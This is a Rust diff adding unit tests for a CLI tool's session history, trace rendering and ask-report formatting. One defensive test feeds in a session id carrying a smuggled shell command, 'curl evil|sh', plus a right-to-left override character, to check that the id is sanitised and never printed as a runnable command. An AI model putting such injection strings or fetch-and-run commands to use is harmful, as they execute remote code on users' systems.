+            // else in the tree compares them: the context crate's own chain
+            // threads `next_session` by hand, which is not the production
+            // path.
+            let now_turns = store.turn_runs_for_session("session").expect("turns");
+            let now_rows = store.history_for_session("session").expect("history");
+            let recomputed =
+                derive_session_state(&store, "session", &now_turns, &now_rows).expect("ledger");
+            assert_eq!(
+                recomputed, built.next_session,
+                "turn {turn}: recomputing gives back the ledger the build handed forward"
+            );
+        }
+    }
+
+    /// A trace whose only content is history — the section
+    /// `SummaryV1::tokens_before` is read back from. Everything else is
+    /// empty on purpose: this fixture exists to make that one number
+    /// observable at the outlet, not to exercise the rest of the rendering.
+    fn a_trace_with_history(
+        history: Vec<momotaro_contracts::HistoryItemRecord>,
+    ) -> momotaro_contracts::RunTrace {
+        momotaro_contracts::RunTrace {
+            run: momotaro_contracts::RunRecord {
+                run_id: "run-1".to_owned(),
+                session_id: Some("session".to_owned()),
+                parent_run_id: None,
+                project_id: None,
+                graph_id: None,
+                node_id: None,
+                attempt: 1,
+                mode: "ask".to_owned(),
+                query: "q".to_owned(),
+                status: "finished".to_owned(),
+                client_request_id: None,
+                run_spec_hash: "h".to_owned(),
+                run_spec_json: "{}".to_owned(),
+                provider: None,
+                model: None,
+                context_window: None,
+                max_output_tokens: None,
+                result_digest: None,
+                failure_note: None,
+                deadline_at: None,
+                created_at: 1,
+                finished_at: Some(2),
+            },
+            events: Vec::new(),
+            retrievals: Vec::new(),
+            context_items: Vec::new(),
+            llm_turns: Vec::new(),
+            verifications: Vec::new(),
+            answer: None,
+            history,
+        }
+    }
+
+    /// `tokens_before` says how much history the compaction replaced; without
+    /// it a trace can show *that* a summary exists but not what making one
+    /// cost. It is read from a `summary.v1` body and nowhere else — the plain
+    /// turn line stays bare — and a body that will not parse is named, not
+    /// silently blanked (the replay path quarantines the same row the same
+    /// way).
+    #[test]
+    fn the_trace_reads_the_summary_s_tokens_before_back_out() {
+        let summary_body = serde_json::json!({
+            "version": "v1",
+            "covered_turns": ["hist-1"],
+            "first_kept_item_id": "hist-2",
+            "tokens_before": 6543,
+            "user_decisions": [],
+            "open_questions": [],
+            "evidence_refs": [],
+            "next_action_hint": "(none)",
+        })
+        .to_string();
+
+        let mut summary = a_history_row();
+        summary.seq = 2;
+        summary.history_id = "hist-2".to_owned();
+        summary.kind = "summary".to_owned();
+        summary.content_kind = "summary.v1".to_owned();
+        summary.body = summary_body;
+
+        let mut broken = a_history_row();
+        broken.seq = 3;
+        broken.history_id = "hist-3".to_owned();
+        broken.kind = "summary".to_owned();
+        broken.content_kind = "summary.v1".to_owned();
+        broken.body = "{not summary.v1 at all".to_owned();
+
+        let rendered = format_trace(&a_trace_with_history(vec![
+            a_history_row(),
+            summary,
+            broken,
+        ]));
+        let block = rendered
+            .split("\nhistory:\n")
+            .nth(1)
+            .expect("the rendering has a history section");
+        assert_eq!(
+            block,
+            "  1 user turn\n  2 user summary (6543 tokens before)\n  \
+             3 user summary (summary.v1 unreadable)\n",
+            "one reader, three shapes: {rendered}"
+        );
+    }
+
+    /// One row shaped exactly as `ask` writes it — for the tests below that
+    /// need to bend one field at a time.
+    fn a_history_row() -> momotaro_contracts::HistoryItemRecord {
+        momotaro_contracts::HistoryItemRecord {
+            history_id: "hist-1".to_owned(),
+            session_id: Some("session".to_owned()),
+            run_id: "run-1".to_owned(),
+            seq: 1,
+            kind: "turn".to_owned(),
+            role: "user".to_owned(),
+            content_kind: "text".to_owned(),
+            body: "the question".to_owned(),
+            payload_json: serde_json::json!({ "referenced_chunk_hashes": ["h1"] }).to_string(),
+            source_ref_json: None,
+            token_estimate: 4,
+            created_at: 100,
+            occurred_at: Some(100),
+        }
+    }
+
+    /// Every field `AskReport` carries has to appear in the human rendering —
+    /// `format_ask`'s own doc promises 两出口字段一致. Until now nothing could
+    /// tell: all four fixtures in this module carry `answer_text: None`, no
+    /// citations, no integrity and no failure note, so deleting the entire
+    /// body of the function left the workspace byte-for-byte green.
+    #[test]
+    fn the_human_report_renders_every_field_the_json_carries() {
+        let report = AskReport {
+            run_id: "run-1".to_owned(),
+            session_id: Some("sess-9".to_owned()),
+            status: "failed".to_owned(),
+            query: "why is the sky blue?".to_owned(),
+            answer_id: Some("ans-1".to_owned()),
+            answer_text: Some("Rayleigh scattering [f0002].".to_owned()),
+            fully_verified: false,
+            citations: vec![CitationVerdict {
+                citation_index: 0,
+                source_key: "note/a.md".to_owned(),
+                revision_hash: "rev-a".to_owned(),
+                chunk_id: "c1".to_owned(),
+                chunk_hash: "h1".to_owned(),
+                locator_json: "{\"line\":3}".to_owned(),
+                quoted_text: "the sky is blue".to_owned(),
+                verified: false,
+                status: "failed".to_owned(),
+                detail: Some("quote not found".to_owned()),
+            }],
+            integrity: vec![IntegrityVerdict {
+                source_key: "note/b.md".to_owned(),
+                revision_hash: "rev-b".to_owned(),
+                status: "source_integrity".to_owned(),
+                detail: Some("bytes missing".to_owned()),
+            }],
+            failure_note: Some("citations did not verify".to_owned()),
+        };
+        let rendered = format_ask(&report);
+
+        for needle in [
+            "run run-1 (failed)",
+            "session sess-9",
+            "query: why is the sky blue?",
+            "Rayleigh scattering [f0002].",
+            "answer_id: ans-1",
+            "fully verified: no",
+            "citations:",
+            "[0] note/a.md@rev-a",
+            "hash h1",
+            "— failed (quote not found)",
+            "source integrity:",
+            "note/b.md@rev-b — source_integrity (bytes missing)",
+            "failure: citations did not verify",
+        ] {
+            assert!(
+                rendered.contains(needle),
+                "the human outlet has to carry `{needle}`: {rendered}"
+            );
+        }
+
+        // …and the empty halves of the same branches, so neither `if` is
+        // driven by only one arm.
+        let bare = AskReport {
+            answer_text: None,
+            answer_id: None,
+            citations: Vec::new(),
+            integrity: Vec::new(),
+            failure_note: None,
+            ..report
+        };
+        let rendered = format_ask(&bare);
+        assert!(
+            rendered.contains("(no answer was saved)"),
+            "an unsaved answer says so: {rendered}"
+        );
+        assert!(
+            rendered.contains("citations: none"),
+            "an empty citation list says so: {rendered}"
+        );
+        assert!(
+            !rendered.contains("source integrity:"),
+            "…and an empty integrity list prints no block: {rendered}"
+        );
+        assert!(
+            !rendered.contains("failure:"),
+            "…nor a failure line that was never set: {rendered}"
+        );
+    }
+
+    /// Both `history_item` branches that answer `RunError::Invariant`.
+    ///
+    /// The first is closed by construction — `TURN_RUNS_PREDICATE` is shared
+    /// by the two readers that feed this function, and `commit_run_answer`
+    /// refuses a row whose `session_id` disagrees with its run's. The
+    /// **second is not**: `commit_run_answer` writes `role` straight through
+    /// and the DDL has no CHECK, so any caller of the `pub` API can land a
+    /// value outside `user | assistant`. Both are worth keeping, so both get
+    /// driven here rather than left as code nothing can turn red on.
+    #[test]
+    fn a_history_row_that_breaks_an_invariant_never_reaches_the_model() {
+        let axes = std::collections::HashMap::from([("run-1", (1u32, 0usize))]);
+
+        let mut orphan = a_history_row();
+        orphan.run_id = "run-2".to_owned();
+        let error = history_item(&orphan, &axes).expect_err("the run is not on the axis");
+        assert!(
+            matches!(error, RunError::Invariant(_)),
+            "a history row whose run did not write history is an invariant \
+             violation, not a replay: {error}"
+        );
+
+        let mut stranger = a_history_row();
+        stranger.role = "system".to_owned();
+        let error = history_item(&stranger, &axes).expect_err("unknown role");
+        assert!(
+            matches!(error, RunError::Invariant(_)),
+            "only `user` and `assistant` exist in the vocabulary: {error}"
+        );
+
+        // The shape the two branches exist to protect: a row that *is* on the
+        // axis and *does* carry a known role still maps.
+        assert!(
+            history_item(&a_history_row(), &axes).is_ok(),
+            "…and the ordinary row is unaffected"
+        );
+    }
+
+    /// The three readers that **degrade** instead of erroring, by design
+    /// (`"costs the dedup hint, not the text"`).
+    ///
+    /// A degradation nothing observes is a silent one: corrupt `payload_json`
+    /// would empty the whole dedup base and let every chunk be re-sent, and a
+    /// fragment id that stops parsing would restart the counter — neither
+    /// would turn a single test red.
+    #[test]
+    fn a_malformed_row_degrades_to_nothing_instead_of_failing_the_turn() {
+        assert_eq!(
+            referenced_hashes(
+                &serde_json::json!({ "referenced_chunk_hashes": ["h1", "h2"] }).to_string()
+            ),
+            ["h1", "h2"],
+            "the well-formed case"
+        );
+        assert!(
+            referenced_hashes("not json at all").is_empty(),
+            "unparseable payload_json yields no hashes, not an error"
+        );
+        assert!(
+            referenced_hashes("{}").is_empty(),
+            "a payload with no hashes array yields no hashes"
+        );
+
+        assert_eq!(
+            evidence_chunk_hash(&Some(serde_json::json!({ "chunk_hash": "h9" }).to_string())),
+            Some("h9".to_owned())
+        );
+        assert_eq!(
+            evidence_chunk_hash(&Some("{broken".to_owned())),
+            None,
+            "an unparseable source_ref earns no position slot rather than \
+             failing the build"
+        );
+        assert_eq!(evidence_chunk_hash(&None), None);
+
+        assert_eq!(fragment_number("f0001"), Some(1));
+        assert_eq!(fragment_number("f10000"), Some(10_000));
+        assert_eq!(
+            fragment_number("g0001"),
+            None,
+            "an id without the `f` prefix parses to nothing"
+        );
+        assert_eq!(fragment_number("f"), None);
+    }
+
+    #[test]
+    fn turn_axes_number_from_one_and_position_from_zero() {
+        let runs = vec!["run-bbb".to_owned(), "run-aaa".to_owned()];
+        let axes = turn_axes(&runs);
+        assert_eq!(axes.len(), 2);
+        assert_eq!(axes["run-bbb"], (1, 0), "the first turn run is round 1");
+        assert_eq!(axes["run-aaa"], (2, 1), "not round 0");
+        assert!(turn_axes(&[]).is_empty(), "no turns, no axes");
+    }
+
+    /// The title is cut by **character**. A byte slice would split a CJK
+    /// question in half, which is what `SESSION_TITLE_CHARS` exists to avoid.
+    #[test]
+    fn session_title_keeps_the_question_by_character() {
+        let short = session_title("为什么天空是蓝的");
+        assert_eq!(short, "为什么天空是蓝的", "under the limit, untouched");
+
+        let exactly: String = "问".repeat(80);
+        assert_eq!(
+            session_title(&exactly),
+            exactly,
+            "exactly the limit is not truncated"
+        );
+
+        let over: String = "问".repeat(85);
+        let title = session_title(&over);
+        assert_eq!(
+            title.chars().count(),
+            81,
+            "cut to the limit by character, plus the ellipsis"
+        );
+        assert!(title.ends_with('…'), "an overflow is marked: {title}");
+        assert!(
+            title.chars().all(|c| c == '问' || c == '…'),
+            "no byte was cut through the middle of a character: {title}"
+        );
+    }
+
+    /// The session id is the only handle on the next turn, so both halves of
+    /// the human report that are supposed to carry it are asserted here —
+    /// the header line and the copy-pasteable command after the answer.
+    #[test]
+    fn the_human_report_names_the_session_and_the_next_turn() {
+        let report = AskReport {
+            run_id: "run-1".to_owned(),
+            session_id: Some("sess-9".to_owned()),
+            status: "finished".to_owned(),
+            query: "why is the sky blue?".to_owned(),
+            answer_id: None,
+            answer_text: None,
+            fully_verified: false,
+            citations: Vec::new(),
+            integrity: Vec::new(),
+            failure_note: None,
+        };
+        let rendered = format_ask(&report);
+        assert!(
+            rendered.contains("session sess-9"),
+            "the header names the session: {rendered}"
+        );
+        assert!(
+            rendered.contains("continue: momotaro ask --session sess-9 \"…\""),
+            "the report hands back the next command, with the id **unquoted** — \
+             a POSIX quote is a literal quote in `cmd.exe`, so quoting to please \
+             one shell breaks another: {rendered}"
+        );
+
+        // A run from before this wave has no session; neither line appears
+        // rather than printing an empty handle.
+        let legacy = AskReport {
+            session_id: None,
+            ..report
+        };
+        let rendered = format_ask(&legacy);
+        assert!(
+            !rendered.contains("session "),
+            "no session, no session line"
+        );
+        assert!(
+            !rendered.contains("continue:"),
+            "no session, no continuation hint"
+        );
+    }
+
+    /// The two things a session id has to survive on its way to a terminal,
+    /// and the price of each.
+    ///
+    /// `sanitize` strips the terminal-control half; `is_session_id_shaped`
+    /// decides whether the shell half gets a command line at all (see there
+    /// for why quoting is not an option). This drives both halves, and the
+    /// raw-vs-sanitized edge is pinned below.
+    #[test]
+    fn the_continuation_line_is_printed_only_for_an_id_a_shell_can_take_raw() {
+        let hostile = AskReport {
+            run_id: "run-1".to_owned(),
+            session_id: Some("x\"; curl evil|sh; #\u{202e}y".to_owned()),
+            status: "finished".to_owned(),
+            query: "q".to_owned(),
+            answer_id: None,
+            answer_text: None,
+            fully_verified: false,
+            citations: Vec::new(),
+            integrity: Vec::new(),
+            failure_note: None,
+        };
+        let rendered = format_ask(&hostile);
+        assert!(
+            !rendered.contains("continue:"),
+            "an id outside `stamp_id`'s charset earns no command line rather \
+             than a command that cannot run: {rendered}"
+        );
+        let header = rendered
+            .lines()
+            .find(|line| line.starts_with("session "))
+            .expect("the header still names the session");
+        assert!(
+            !header.contains('\u{202e}'),
+            "a right-to-left override must not reach the terminal: {header:?}"
+        );
+        assert!(
+            header.contains("x\"; curl evil|sh; #y"),
+            "…and the id is still readable, RLO stripped and nothing else \
+             touched: {header:?}"
+        );
+
+        // The minted shape goes through **unquoted**, which is what makes it
+        // pasteable in all three shells at once.
+        for id in ["sess-9", "sess-1791132588704-29fc3568", "a_b-C1"] {
+            assert!(is_session_id_shaped(id), "{id} is what `stamp_id` mints");
+        }
+        for id in ["", "-rf", "x\"; y", "a b", "'x'", "café", "a'b"] {
+            assert!(
+                !is_session_id_shaped(id),
+                "{id} must never be printed as a command"
+            );
+        }
+
+        // The edge that makes the guard read the *raw* id: `sanitize`
+        // rewrites whitespace to a space and drops the unprintable set, so
+        // this sanitizes down to a shaped id and would print a command for a
+        // session that does not exist.
+        let invisible = AskReport {
+            session_id: Some("abc\u{202e}def".to_owned()),
+            ..hostile
+        };
+        assert!(
+            !format_ask(&invisible).contains("continue:"),
+            "the guard runs before `sanitize`, not on its projection"
+        );
     }
 }
